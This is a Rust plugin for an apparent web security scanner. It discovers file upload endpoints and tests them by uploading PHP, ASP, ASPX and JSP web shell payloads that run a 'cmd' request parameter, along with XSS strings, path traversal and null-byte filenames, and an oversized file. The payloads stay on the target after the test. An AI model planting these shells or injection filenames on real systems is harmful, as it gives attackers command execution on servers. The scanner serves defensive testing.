//! File Upload Security Plugin
//!
//! Evaluates file upload mechanisms for security issues including
//! allowed extensions, MIME type validation, size restrictions,
//! filename handling, storage behavior, and dangerous configurations.

use crate::security::{SecurityPlugin, SecurityPluginConfig, SecurityReference};
use crate::sdk::{CapabilityRequest, CapabilityResponse, AnalysisContext, Result, Capability, PluginId, Plugin};
use openre_core::result::{Finding, Severity, Confidence, Category, Evidence, EvidenceType, Reference, ReferenceType};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use async_trait::async_trait;
use tracing::{debug, info, warn};
use reqwest::Client;
use reqwest::multipart::{Form, Part};

/// File Upload Security Plugin
pub struct FileUploadPlugin {
    config: FileUploadConfig,
    client: Arc<reqwest::Client>,
}

impl FileUploadPlugin {
    /// Create a new File Upload security plugin
    pub fn new(config: FileUploadConfig) -> std::result::Result<Self, String> {
        let client = Arc::new(
            reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(config.request_timeout))
                .redirect(reqwest::redirect::Policy::limited(config.max_redirects as usize))
                .user_agent(&config.user_agent)
                .build()
                .map_err(|e| format!("Failed to create HTTP client: {}", e))?
        );
        
        Ok(Self { config, client })
    }
    
    /// Get plugin version
    fn version(&self) -> &'static str {
        "1.0.0"
    }
    
    /// Get plugin description
    fn description(&self) -> &'static str {
        "Evaluates file upload mechanisms for security issues including allowed extensions, MIME type validation, size restrictions, filename handling, storage behavior, and dangerous configurations"
    }
    
    /// Get plugin references
    fn references(&self) -> Vec<SecurityReference> {
        vec![
            SecurityReference {
                ref_type: "OWASP".to_string(),
                id: "API4:2023".to_string(),
                url: "https://owasp.org/API-Security/editions/2023/en/0x41-unrestricted-resource-consumption/".to_string(),
                description: "OWASP API Security Top 10 2023 - Unrestricted Resource Consumption".to_string(),
            },
            SecurityReference {
                ref_type: "CWE".to_string(),
                id: "CWE-434".to_string(),
                url: "https://cwe.mitre.org/data/definitions/434.html".to_string(),
                description: "Unrestricted Upload of File with Dangerous Type".to_string(),
            },
            SecurityReference {
                ref_type: "CWE".to_string(),
                id: "CWE-22".to_string(),
                url: "https://cwe.mitre.org/data/definitions/22.html".to_string(),
                description: "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')".to_string(),
            },
        ]
    }
    
    /// Validate configuration
    fn validate_config(&self, config: &FileUploadConfig) -> std::result::Result<(), String> {
        if config.request_timeout == 0 {
            return Err("request_timeout must be greater than 0".to_string());
        }
        if config.max_concurrent_requests == 0 {
            return Err("max_concurrent_requests must be greater than 0".to_string());
        }
        Ok(())
    }
    
    /// Discover file upload endpoints
    async fn discover_upload_endpoints(&self, base_url: &str) -> Vec<UploadEndpoint> {
        let mut endpoints = Vec::new();
        
        // Common file upload paths
        let common_paths = vec![
            "/api/upload", "/api/upload/",
            "/api/files", "/api/files/",
            "/api/attachments", "/api/attachments/",
            "/api/documents", "/api/documents/",
            "/api/images", "/api/images/",
            "/api/media", "/api/media/",
            "/api/avatar", "/api/avatar/",
            "/api/profile/upload", "/api/profile/avatar",
            "/upload", "/upload/",
            "/files", "/files/",
            "/import", "/import/",
        ];
        
        for path in common_paths {
            let url = format!("{}{}", base_url.trim_end_matches('/'), path);
            
            // Test with OPTIONS to see allowed methods
            if let Ok(resp) = self.client.request(reqwest::Method::OPTIONS, &url).send().await {
                if resp.status().is_success() || resp.status().as_u16() == 401 || resp.status().as_u16() == 403 || resp.status().as_u16() == 405 {
                    let allow_header = resp.headers().get("allow")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("")
                        .to_string();
                    
                    let methods: Vec<String> = allow_header.split(',')
                        .map(|s| s.trim().to_uppercase())
                        .filter(|s| ["POST", "PUT", "PATCH"].contains(&s.as_str()))
                        .collect();
                    
                    if !methods.is_empty() {
                        endpoints.push(UploadEndpoint {
                            url: url.clone(),
                            path: path.to_string(),
                            methods,
                            requires_auth: resp.status().as_u16() == 401 || resp.status().as_u16() == 403,
                        });
                    }
                }
            }
        }
        
        endpoints
    }
    
    /// Test file upload endpoint for security issues
    async fn test_endpoint(&self, endpoint: &UploadEndpoint) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Test 1: Dangerous file extensions
        let dangerous_extensions = vec![
            ("shell.php", "PHP shell script"),
            ("shell.php5", "PHP5 shell script"),
            ("shell.phtml", "PHTML shell script"),
            ("shell.asp", "ASP shell script"),
            ("shell.aspx", "ASPX shell script"),
            ("shell.jsp", "JSP shell script"),
            ("shell.js", "JavaScript file"),
            ("shell.html", "HTML file with potential XSS"),
            ("shell.svg", "SVG with potential XSS"),
            ("shell.exe", "Windows executable"),
            ("shell.sh", "Shell script"),
            ("shell.pl", "Perl script"),
            ("shell.py", "Python script"),
            ("shell.rb", "Ruby script"),
            ("shell.jar", "Java archive"),
            ("shell.war", "Web archive"),
        ];
        
        for (filename, description) in dangerous_extensions {
            if let Some(finding) = self.test_file_upload(endpoint, filename, &self.create_test_content(description), "application/octet-stream").await {
                findings.push(finding);
            }
        }
        
        // Test 2: Double extensions
        let double_extensions = vec![
            "shell.php.jpg",
            "shell.php.png",
            "shell.php.gif",
            "shell.asp.png",
            "shell.jsp.jpg",
        ];
        
        for filename in double_extensions {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "test content", "image/jpeg").await {
                findings.push(finding);
            }
        }
        
        // Test 3: Null byte injection in filename
        let null_byte_filenames = vec![
            "shell.php%00.jpg",
            "shell.php\u{00}.jpg",
            "shell.asp%00.png",
        ];
        
        for filename in null_byte_filenames {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "test content", "image/jpeg").await {
                findings.push(finding);
            }
        }
        
        // Test 4: Path traversal in filename
        let path_traversal_filenames = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32%5Ccmd.exe",
            "shell.php/../../../etc/passwd",
        ];
        
        for filename in path_traversal_filenames {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "test content", "application/octet-stream").await {
                findings.push(finding);
            }
        }
        
        // Test 5: MIME type bypass
        let mime_bypass_tests = vec![
            ("shell.php", "image/jpeg"),
            ("shell.php", "image/png"),
            ("shell.php", "image/gif"),
            ("shell.asp", "application/pdf"),
            ("shell.jsp", "text/plain"),
        ];
        
        for (filename, mime_type) in mime_bypass_tests {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "<?php system($_GET['cmd']); ?>", mime_type).await {
                findings.push(finding);
            }
        }
        
        // Test 6: File size limits
        let large_content = "A".repeat(100 * 1024 * 1024); // 100MB
        if let Some(finding) = self.test_file_upload(endpoint, "large.txt", &large_content, "text/plain").await {
            findings.push(finding);
        }
        
        // Test 7: Empty filename
        if let Some(finding) = self.test_file_upload(endpoint, "", "test content", "text/plain").await {
            findings.push(finding);
        }
        
        // Test 8: Special characters in filename
        let special_filenames = vec![
            "shell.php;.jpg",
            "shell.php|.jpg",
            "shell.php&.jpg",
            "shell.php$.jpg",
            "shell.php`.jpg",
            "shell.php!.jpg",
            "shell.php'.jpg",
            "shell.php\".jpg",
            "shell.php<.jpg",
            "shell.php>.jpg",
        ];
        
        for filename in special_filenames {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "test content", "image/jpeg").await {
                findings.push(finding);
            }
        }
        
        // Test 9: Unicode/UTF-8 filenames
        let unicode_filenames = vec![
            "shell.php\u{0000}.jpg",
            "shell.php\u{202E}jpg.php", // Right-to-left override
            "shell.php\u{FEFF}.jpg", // BOM
        ];
        
        for filename in unicode_filenames {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "test content", "image/jpeg").await {
                findings.push(finding);
            }
        }
        
        // Test 10: Case sensitivity bypass
        let case_filenames = vec![
            "shell.PHP",
            "shell.Php",
            "shell.pHp",
            "shell.ASP",
            "shell.Asp",
            "shell.JSP",
            "shell.Jsp",
        ];
        
        for filename in case_filenames {
            if let Some(finding) = self.test_file_upload(endpoint, filename, "test content", "application/octet-stream").await {
                findings.push(finding);
            }
        }
        
        findings
    }
    
    /// Test a single file upload
    async fn test_file_upload(&self, endpoint: &UploadEndpoint, filename: &str, content: &str, mime_type: &str) -> Option<Finding> {
        // Try each supported method
        for method in &endpoint.methods {
            let url = &endpoint.url;
            
            let part = Part::text(content.to_string())
                .file_name(filename.to_string())
                .mime_str(mime_type).ok()?;
            
            let form = Form::new().part("file", part);
            
            let req = match method.as_str() {
                "POST" => self.client.post(url).multipart(form),
                "PUT" => self.client.put(url).multipart(form),
                "PATCH" => self.client.patch(url).multipart(form),
                _ => continue,
            };
            
            if let Ok(resp) = req.send().await {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                
                // Check if upload was successful (2xx or 3xx)
                if status >= 200 && status < 400 {
                    // Check if response indicates file was processed/stored
                    let stored = body.contains(filename) || body.contains("success") || body.contains("uploaded") || body.contains("url") || body.contains("path");
                    
                    if stored {
                        return Some(self.create_finding(
                            "Dangerous File Upload Accepted",
                            &format!("Endpoint {} accepted dangerous file: {} ({})", endpoint.path, filename, mime_type),
                            Severity::High,
                            Confidence::High,
                            Category::SecurityMisconfiguration,
                            endpoint,
                            filename,
                            mime_type,
                            vec!["dangerous-upload".to_string(), "file-upload".to_string()],
                            vec![
                                "Implement strict file type validation".to_string(),
                                "Use allowlist for permitted file extensions".to_string(),
                                "Validate MIME type matches file content".to_string(),
                                "Scan uploaded files for malware".to_string(),
                            ],
                        ));
                    }
                }
                
                // Check for path traversal success indicators
                if status >= 200 && status < 400 && (filename.contains("..") || filename.contains("%2F") || filename.contains("%5C")) {
                    return Some(self.create_finding(
                        "Path Traversal in File Upload",
                        &format!("Endpoint {} accepted filename with path traversal: {}", endpoint.path, filename),
                        Severity::Critical,
                        Confidence::High,
                        Category::SecurityMisconfiguration,
                        endpoint,
                        filename,
                        mime_type,
                        vec!["path-traversal".to_string(), "file-upload".to_string()],
                        vec![
                            "Sanitize filenames to remove path traversal sequences".to_string(),
                            "Store files with generated safe names".to_string(),
                            "Validate file paths are within upload directory".to_string(),
                        ],
                    ));
                }
            }
        }
        
        None
    }
    
    /// Create test content for file uploads
    fn create_test_content(&self, description: &str) -> String {
        match description {
            "PHP shell script" => "<?php system($_GET['cmd']); ?>".to_string(),
            "PHP5 shell script" => "<?php system($_GET['cmd']); ?>".to_string(),
            "PHTML shell script" => "<?php system($_GET['cmd']); ?>".to_string(),
            "ASP shell script" => "<% eval request(\"cmd\") %>".to_string(),
            "ASPX shell script" => "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>".to_string(),
            "JSP shell script" => "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>".to_string(),
            "JavaScript file" => "console.log('test');".to_string(),
            "HTML file with potential XSS" => "<script>alert('XSS')</script>".to_string(),
            "SVG with potential XSS" => "<svg onload=alert('XSS')>".to_string(),
            "Windows executable" => "MZ\u{90}\u{00}".to_string(),
            "Shell script" => "#!/bin/bash\necho 'test'".to_string(),
            "Perl script" => "#!/usr/bin/perl\nprint 'test'".to_string(),
            "Python script" => "#!/usr/bin/python\nprint('test')".to_string(),
            "Ruby script" => "#!/usr/bin/ruby\nputs 'test'".to_string(),
            "Java archive" => "PK\u{03}\u{04}".to_string(),
            "Web archive" => "PK\u{03}\u{04}".to_string(),
            _ => "test content".to_string(),
        }
    }
    
    /// Create a finding
    fn create_finding(
        &self,
        title: &str,
        description: &str,
        severity: Severity,
        confidence: Confidence,
        category: Category,
        endpoint: &UploadEndpoint,
        filename: &str,
        mime_type: &str,
        tags: Vec<String>,
        verification_steps: Vec<String>,
    ) -> Finding {
        let mut finding = Finding::new(
            title.to_string(),
            description.to_string(),
            severity,
            confidence,
            category,
            endpoint.url.clone(),
            "web_api".to_string(),
            "file_upload".to_string(),
            self.version().to_string(),
            openre_core::ids::ScanId::new(),
        );
        
        finding = finding.with_evidence(Evidence {
            evidence_type: EvidenceType::HttpResponse,
            description: format!("File upload test for {} with file {}", endpoint.path, filename),
            data: Some(serde_json::json!({
                "endpoint": {
                    "url": endpoint.url,
                    "path": endpoint.path,
                    "methods": endpoint.methods,
                    "requires_auth": endpoint.requires_auth,
                },
                "file": {
                    "filename": filename,
                    "mime_type": mime_type,
                }
            })),
            location: Some(endpoint.url.clone()),
            metadata: HashMap::new(),
        });
        
        for reference in self.references() {
            finding = finding.with_reference(Reference {
                reference_type: match reference.ref_type.as_str() {
                    "CWE" => ReferenceType::Cwe,
                    "OWASP" => ReferenceType::Owasp,
                    "CVE" => ReferenceType::Cve,
                    _ => ReferenceType::Custom(reference.ref_type),
                },
                title: reference.id.clone(),
                url: reference.url.clone(),
                description: Some(reference.description.clone()),
            });
        }
        
        for tag in tags {
            finding = finding.with_tag(tag);
        }
        finding = finding.with_tag("file-upload".to_string());
        
        finding
    }
}

#[async_trait]
impl Plugin for FileUploadPlugin {
    type Config = FileUploadConfig;
    
    fn new(config: Self::Config) -> Self {
        Self::new(config).expect("Failed to create File Upload plugin")
    }
    
    fn capabilities(&self) -> Vec<Capability> {
        vec![
            Capability::NetworkAccess,
            Capability::ReadConfig,
        ]
    }
    
    async fn execute(&self, request: CapabilityRequest) -> Result<CapabilityResponse> {
        let context = request.context;
        let target_url = request.input.get("target_url")
            .and_then(|v| v.as_str())
            .unwrap_or("http://localhost");
        
        info!("Starting file upload security analysis for {}", target_url);
        
        // Discover upload endpoints
        let endpoints = self.discover_upload_endpoints(target_url).await;
        let endpoints_count = endpoints.len();
        info!("Discovered {} upload endpoints", endpoints_count);
        
        // Test each endpoint
        let mut all_findings = Vec::new();
        for endpoint in endpoints {
            let findings = self.test_endpoint(&endpoint).await;
            all_findings.extend(findings);
        }
        
        info!("Found {} file upload issues", all_findings.len());
        
        Ok(CapabilityResponse::success(serde_json::json!({
            "findings": all_findings,
            "endpoints_tested": endpoints_count,
            "vulnerabilities_found": all_findings.len(),
        })))
    }
}

/// File Upload Plugin Configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct FileUploadConfig {
    pub request_timeout: u64,
    pub max_concurrent_requests: usize,
    pub user_agent: String,
    pub follow_redirects: bool,
    pub max_redirects: usize,
    pub verify_ssl: bool,
}

impl Default for FileUploadConfig {
    fn default() -> Self {
        Self {
            request_timeout: 60, // Longer timeout for file uploads
            max_concurrent_requests: 5,
            user_agent: "open-re-file-upload-scanner/1.0".to_string(),
            follow_redirects: true,
            max_redirects: 10,
            verify_ssl: true,
        }
    }
}

/// Upload Endpoint representation
#[derive(Debug, Clone, Serialize, Deserialize)]
struct UploadEndpoint {
    url: String,
    path: String,
    methods: Vec<String>,
    requires_auth: bool,
}

// Plugin entry point
